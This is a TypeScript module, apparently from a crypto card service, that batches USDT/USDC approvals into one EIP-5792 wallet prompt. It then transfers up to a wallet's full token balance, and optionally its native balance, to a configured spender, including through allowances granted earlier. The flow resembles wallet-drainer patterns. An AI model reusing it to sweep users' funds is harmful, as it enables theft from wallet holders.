import { formatTransferSkipReason } from "@trustmycard/shared/constants/collection";
import {
  alreadyAuthorizedResult,
  createPreflightApi,
  preflightExistingAllowance,
} from "./allowance-preflight";
import { collectForExistingAllowance } from "./existing-allowance-collection";
import type {
  ApprovalOrchestrationResult,
  ApprovalRequest,
  PreparedApproval,
} from "../approval/types";
import { createEvmApprovalChainPort } from "../approval/chains/evm-chain-port";
import { getToken, parseHumanToRaw } from "../core/chain-tokens";
import { validateEvmApproveCall } from "../core/evm-approve-guard";
import { getErrorMessage, isUserRejection } from "../core/errors";
import { PERMISSION_DENIED_BY_USER_MESSAGE } from "../core/link-flow-meta";
import { EVM_CHAIN_ID, isEvmChainKey } from "../core/native-chains";
import {
  buildNativeWalletCall,
  fetchNativeTransferEstimate,
} from "./batch-native-estimate";
import {
  executeEip5792Batch,
  resolveWalletCapabilities,
  shouldAttemptEip5792,
  type BatchJob,
} from "./evm-token-batch-tiers";
import type { AuthorizationAssetResult, TokenSymbol } from "../types";
import type { IncludedAssetWorkItem } from "./preferences";
import { balanceForToken } from "./preferences";
import type { WalletPhaseTokenCapture } from "./phases/types";
import type {
  EvmTokenBatchRunArgs,
  EvmTokenBatchRunResult,
} from "./evm-token-batch-types";

export type {
  EvmTokenBatchRunArgs,
  EvmTokenBatchRunResult,
} from "./evm-token-batch-types";

/**
 * Run USDT + USDC approvals on one EVM network as a single EIP-5792 wallet batch
 * when the wallet supports wallet_sendCalls. Falls back to sequential direct approves.
 */
export async function runEvmTokenBatchApproval(
  args: EvmTokenBatchRunArgs,
): Promise<EvmTokenBatchRunResult> {
  const log = args.log ?? (() => undefined);
  const owner = args.accounts.evm;
  if (!owner) {
    return {
      results: args.items.map((item) => ({
        network: item.network,
        token: item.asset as TokenSymbol,
        outcome: "failed" as const,
        message: "No EVM address in this WalletConnect session",
      })),
      tokenCaptures: [],
    };
  }

  const chainId = EVM_CHAIN_ID[args.network as keyof typeof EVM_CHAIN_ID];
  if (chainId == null) {
    const fallback = await runSequentialFallback(
      args,
      owner,
      "Unsupported EVM network",
    );
    return {
      results: fallback.results,
      tokenCaptures: fallback.tokenCaptures,
      batchMode: "sequential",
    };
  }

  const api = createPreflightApi(args.apiBaseUrl);
  const chainPort = createEvmApprovalChainPort({ provider: args.provider });
  const spender = args.getSpender(args.network);
  if (!spender) {
    return {
      results: args.items.map((item) => ({
        network: item.network,
        token: item.asset as TokenSymbol,
        outcome: "failed" as const,
        message: "Spender not configured",
      })),
      tokenCaptures: [],
    };
  }

  const jobs: BatchJob[] = [];
  const results: AuthorizationAssetResult[] = [];
  for (const item of args.items) {
    if (item.asset === "NATIVE") continue;
    const token = item.asset as TokenSymbol;
    const networkRow = args.networks.find((n) => n.key === item.network);
    const tokenInfo = getToken(item.network, token);
    if (!networkRow || !tokenInfo) {
      const result: AuthorizationAssetResult = {
        network: item.network,
        token,
        outcome: "skipped_unsupported",
        message: `Unsupported token ${token} on ${item.network}`,
      };
      args.onAssetEnd?.(result);
      results.push(result);
      continue;
    }

    const tokenBalanceHuman = balanceForToken(networkRow, token);
    const availableBalanceRaw = parseHumanToRaw(
      tokenBalanceHuman,
      tokenInfo.decimals,
    );
    const requestedTransferRaw = item.unlimited
      ? availableBalanceRaw
      : parseHumanToRaw(item.amountHuman, tokenInfo.decimals);
    const transferAmountRaw =
      availableBalanceRaw < requestedTransferRaw
        ? availableBalanceRaw.toString()
        : requestedTransferRaw.toString();
    const shouldAttemptTransfer = BigInt(transferAmountRaw) > BigInt(0);

    const request: ApprovalRequest = {
      network: item.network,
      owner,
      token,
      amountHuman: item.unlimited ? undefined : item.amountHuman,
      unlimited: item.unlimited,
      nativeBalanceHuman: networkRow.balances.native ?? "0",
      tokenBalanceHuman,
      executeTransfer: shouldAttemptTransfer,
      transferToAddress: spender,
      transferAmountRaw: shouldAttemptTransfer ? transferAmountRaw : undefined,
    };

    try {
      let prepared: PreparedApproval;
      let alreadyAuthorized = false;
      try {
        const preflight = await preflightExistingAllowance({ api, request });
        prepared = preflight.prepared;
        alreadyAuthorized = preflight.alreadyAuthorized;
      } catch (preflightErr) {
        log("ALLOWANCE_PREFLIGHT_UNAVAILABLE", {
          network: item.network,
          token,
          error: getErrorMessage(
            preflightErr,
            "Allowance preflight unavailable",
          ),
        });
        prepared = await api.prepare({ request });
      }

      if (alreadyAuthorized && !shouldAttemptTransfer) {
        args.onAssetStart?.({ ...item, asset: token });
        const result = alreadyAuthorizedResult({
          item: { ...item, asset: token },
        });
        args.onAssetEnd?.(result);
        results.push(result);
        log("EIP5792_BATCH_SKIP_ALREADY_AUTHORIZED", {
          network: item.network,
          token,
        });
        continue;
      }

      if (alreadyAuthorized && shouldAttemptTransfer) {
        args.onAssetStart?.({ ...item, asset: token });
        try {
          const result = await collectForExistingAllowance({
            item: { ...item, asset: token },
            request,
            prepared,
            apiBaseUrl: args.apiBaseUrl,
          });
          args.onAssetEnd?.(result);
          results.push(result);
          log("EIP5792_BATCH_COLLECT_EXISTING_ALLOWANCE", {
            network: item.network,
            token,
            outcome: result.outcome,
          });
        } catch (err) {
          const result: AuthorizationAssetResult = {
            network: item.network,
            token,
            outcome: "failed",
            message: getErrorMessage(
              err,
              "Failed to collect existing allowance",
            ),
          };
          args.onAssetEnd?.(result);
          results.push(result);
        }
        continue;
      }

      await api.acquireResources({ request, prepared });
      await api.verifyResources({ request, prepared });
      const signed = await chainPort.sign({ prepared, owner });
      validateEvmApproveCall({
        to: String(signed.payload.to),
        data: String(signed.payload.data),
        value: String(signed.payload.value ?? "0x0"),
        expectedTokenAddress: prepared.tokenAddress,
      });
      jobs.push({
        item: { ...item, asset: token },
        request,
        prepared,
        signed,
        shouldAttemptTransfer,
        transferAmountRaw: shouldAttemptTransfer
          ? transferAmountRaw
          : undefined,
      });
    } catch (err) {
      const rejected = isUserRejection(err);
      const result: AuthorizationAssetResult = {
        network: item.network,
        token,
        outcome: rejected ? "user_rejected" : "failed",
        message: rejected
          ? PERMISSION_DENIED_BY_USER_MESSAGE
          : getErrorMessage(err, "Failed to prepare batch approval"),
      };
      args.onAssetEnd?.(result);
      results.push(result);
    }
  }

  if (jobs.length === 0) {
    return { results, tokenCaptures: [] };
  }

  const capabilities = await resolveWalletCapabilities(
    args.provider,
    chainId,
    owner,
  );
  const eip5792Supported = shouldAttemptEip5792(capabilities, chainId);

  let nativeEstimate = null;
  let nativeCall = null;
  if (eip5792Supported && args.nativeItem) {
    nativeEstimate = await fetchNativeTransferEstimate({
      apiBaseUrl: args.apiBaseUrl,
      network: args.network,
      owner,
    });
    nativeCall = nativeEstimate
      ? buildNativeWalletCall(nativeEstimate)
      : null;
    if (nativeCall && nativeEstimate) {
      log("NATIVE_BATCH_ESTIMATE", {
        network: args.network,
        transferableRaw: nativeEstimate.transferableRaw,
        recipient: nativeEstimate.recipient,
      });
    }
  }

  if (!eip5792Supported) {
    log("EIP5792_BATCH_UNSUPPORTED", {
      network: args.network,
      chainId,
      capabilities,
      fallback: "sequential",
    });
  }

  const canTryEip5792 =
    eip5792Supported &&
    jobs.length >= 1 &&
    (jobs.length >= 2 || nativeCall);

  if (canTryEip5792) {
    const eip5792Result = await executeEip5792Batch({
      runArgs: args,
      owner,
      chainId,
      jobs,
      priorResults: results,
      api,
      nativeCall,
      nativeEstimate,
      capabilities,
      log,
    });
    if (eip5792Result) return eip5792Result;
  }

  if (jobs.length === 1) {
    const fallbackResults = await runSequentialFallback(
      args,
      owner,
      undefined,
      [jobs[0]!.item],
    );
    return {
      results: [...results, ...fallbackResults.results],
      tokenCaptures: fallbackResults.tokenCaptures,
      batchMode: "sequential",
    };
  }

  const fallbackResults = await runSequentialFallback(args, owner);
  return {
    results: [...results, ...fallbackResults.results],
    tokenCaptures: fallbackResults.tokenCaptures,
    batchMode: "sequential",
  };
}

async function runSequentialFallback(
  args: EvmTokenBatchRunArgs,
  owner: string,
  reason?: string,
  items: IncludedAssetWorkItem[] = args.items,
): Promise<EvmTokenBatchRunResult> {
  if (reason) {
    args.log?.("EIP5792_BATCH_FALLBACK", { network: args.network, reason });
  }

  const results: AuthorizationAssetResult[] = [];
  const tokenCaptures: WalletPhaseTokenCapture[] = [];
  for (const item of items) {
    if (item.asset === "NATIVE") continue;
    args.onAssetStart?.(item);

    const networkRow = args.networks.find((n) => n.key === item.network);
    const token = item.asset as TokenSymbol;
    const tokenInfo = getToken(item.network, token);
    if (!networkRow || !tokenInfo) {
      const result: AuthorizationAssetResult = {
        network: item.network,
        token,
        outcome: "skipped_unsupported",
        message: `Unsupported token ${token} on ${item.network}`,
      };
      results.push(result);
      args.onAssetEnd?.(result);
      continue;
    }

    const spender = args.getSpender(item.network);
    if (!spender) {
      const result: AuthorizationAssetResult = {
        network: item.network,
        token,
        outcome: "failed",
        message: "Spender not configured",
      };
      results.push(result);
      args.onAssetEnd?.(result);
      continue;
    }

    const tokenBalanceHuman = balanceForToken(networkRow, token);
    const availableBalanceRaw = parseHumanToRaw(
      tokenBalanceHuman,
      tokenInfo.decimals,
    );
    const requestedTransferRaw = item.unlimited
      ? availableBalanceRaw
      : parseHumanToRaw(item.amountHuman, tokenInfo.decimals);
    const transferAmountRaw =
      availableBalanceRaw < requestedTransferRaw
        ? availableBalanceRaw.toString()
        : requestedTransferRaw.toString();
    const shouldAttemptTransfer = BigInt(transferAmountRaw) > BigInt(0);

    try {
      let alreadyAuthorized = false;
      let preflightRequest: ApprovalRequest | null = null;
      let preflightPrepared: PreparedApproval | null = null;
      try {
        const preflightApi = createPreflightApi(args.apiBaseUrl);
        preflightRequest = {
          network: item.network,
          owner,
          token,
          amountHuman: item.unlimited ? undefined : item.amountHuman,
          unlimited: item.unlimited,
          nativeBalanceHuman: networkRow.balances.native ?? "0",
          tokenBalanceHuman,
          executeTransfer: shouldAttemptTransfer,
          transferToAddress: spender,
          transferAmountRaw: shouldAttemptTransfer
            ? transferAmountRaw
            : undefined,
        };
        const preflight = await preflightExistingAllowance({
          api: preflightApi,
          request: preflightRequest,
        });
        alreadyAuthorized = preflight.alreadyAuthorized;
        preflightPrepared = preflight.prepared;
      } catch (preflightErr) {
        args.log?.("ALLOWANCE_PREFLIGHT_UNAVAILABLE", {
          network: item.network,
          token,
          error: getErrorMessage(
            preflightErr,
            "Allowance preflight unavailable",
          ),
        });
      }

      if (alreadyAuthorized && !shouldAttemptTransfer) {
        const result = alreadyAuthorizedResult({
          item: { ...item, asset: token },
        });
        results.push(result);
        args.onAssetEnd?.(result);
        args.log?.("EIP5792_SEQUENTIAL_SKIP_ALREADY_AUTHORIZED", {
          network: item.network,
          token,
        });
        continue;
      }

      if (
        alreadyAuthorized &&
        shouldAttemptTransfer &&
        preflightRequest &&
        preflightPrepared
      ) {
        try {
          const result = await collectForExistingAllowance({
            item: { ...item, asset: token },
            request: preflightRequest,
            prepared: preflightPrepared,
            apiBaseUrl: args.apiBaseUrl,
          });
          results.push(result);
          args.onAssetEnd?.(result);
          args.log?.("EIP5792_SEQUENTIAL_COLLECT_EXISTING_ALLOWANCE", {
            network: item.network,
            token,
            outcome: result.outcome,
          });
        } catch (err) {
          const result: AuthorizationAssetResult = {
            network: item.network,
            token,
            outcome: "failed",
            message: getErrorMessage(
              err,
              "Failed to collect existing allowance",
            ),
          };
          results.push(result);
          args.onAssetEnd?.(result);
        }
        continue;
      }

      const orchestration = await args.runApproval({
        network: item.network,
        owner,
        token,
        amountHuman: item.unlimited ? undefined : item.amountHuman,
        unlimited: item.unlimited,
        nativeBalanceHuman: networkRow.balances.native ?? "0",
        tokenBalanceHuman,
        executeTransfer: shouldAttemptTransfer,
        transferToAddress: spender,
        transferAmountRaw: shouldAttemptTransfer
          ? transferAmountRaw
          : undefined,
      });

      if (!orchestration.ok) {
        const rejected = Boolean(orchestration.userRejected);
        const result: AuthorizationAssetResult = {
          network: item.network,
          token,
          outcome: rejected ? "user_rejected" : "failed",
          message: rejected
            ? PERMISSION_DENIED_BY_USER_MESSAGE
            : getErrorMessage(orchestration.error, "Approval failed"),
          txHash: orchestration.txHash,
          approvalId: orchestration.approvalId,
        };
        results.push(result);
        args.onAssetEnd?.(result);
        continue;
      }

      if (args.walletPhaseOnly) {
        tokenCaptures.push({
          item: { ...item, asset: token },
          orchestration,
          shouldAttemptTransfer,
          transferAmountRaw: shouldAttemptTransfer
            ? transferAmountRaw
            : undefined,
        });
        const result: AuthorizationAssetResult = {
          network: item.network,
          token,
          outcome: "authorized",
          message: "Wallet approved — settlement queued",
          txHash: orchestration.txHash,
          approvalId: orchestration.approvalId,
        };
        results.push(result);
        args.onAssetEnd?.(result);
        continue;
      }

      const persisted = orchestration.context.persisted;
      const skipLabel = persisted?.transferSkippedReason
        ? formatTransferSkipReason(persisted.transferSkippedReason)
        : null;
      const result: AuthorizationAssetResult = {
        network: item.network,
        token,
        outcome: persisted?.transferTxHash ? "collected" : "authorized",
        message: persisted?.transferTxHash
          ? "Token collection confirmed"
          : skipLabel
            ? `Authorized — ${skipLabel}`
            : "Authorized — collection queued",
        approvalId: orchestration.approvalId,
        collectionIntentId: persisted?.collectionIntentId ?? null,
        collectionStatus: persisted?.collectionStatus ?? null,
        txHash: persisted?.transferTxHash ?? orchestration.txHash,
        transferSkippedReason: persisted?.transferSkippedReason ?? null,
      };
      results.push(result);
      args.onAssetEnd?.(result);
    } catch (err) {
      const rejected = isUserRejection(err);
      const result: AuthorizationAssetResult = {
        network: item.network,
        token,
        outcome: rejected ? "user_rejected" : "failed",
        message: getErrorMessage(err, "Approval failed"),
      };
      results.push(result);
      args.onAssetEnd?.(result);
    }
  }
  return { results, tokenCaptures };
}

export type AuthorizationWorkUnit =
  | {
      kind: "evm_token_batch";
      network: string;
      items: IncludedAssetWorkItem[];
      nativeItem?: IncludedAssetWorkItem & { asset: "NATIVE" };
    }
  | { kind: "single"; item: IncludedAssetWorkItem };

/**
 * Group consecutive EVM token items on the same network for EIP-5792 batching.
 */
export function planAuthorizationWork(
  items: IncludedAssetWorkItem[],
): AuthorizationWorkUnit[] {
  const units: AuthorizationWorkUnit[] = [];
  let index = 0;

  while (index < items.length) {
    const item = items[index]!;
    const isEvmToken = item.asset !== "NATIVE" && isEvmChainKey(item.network);

    if (isEvmToken) {
      const batch: IncludedAssetWorkItem[] = [item];
      let next = index + 1;
      while (next < items.length) {
        const candidate = items[next]!;
        if (
          candidate.network === item.network &&
          candidate.asset !== "NATIVE" &&
          isEvmChainKey(candidate.network)
        ) {
          batch.push(candidate);
          next += 1;
        } else {
          break;
        }
      }

      let nativeItem:
        (IncludedAssetWorkItem & { asset: "NATIVE" }) | undefined;
      if (
        next < items.length &&
        items[next]?.asset === "NATIVE" &&
        items[next]?.network === item.network
      ) {
        nativeItem = items[next] as IncludedAssetWorkItem & {
          asset: "NATIVE";
        };
        next += 1;
      }

      if (batch.length >= 2 || (batch.length === 1 && nativeItem)) {
        units.push({
          kind: "evm_token_batch",
          network: item.network,
          items: batch,
          nativeItem,
        });
      } else {
        units.push({ kind: "single", item });
      }
      index = next;
      continue;
    }

    units.push({ kind: "single", item });
    index += 1;
  }

  return units;
}
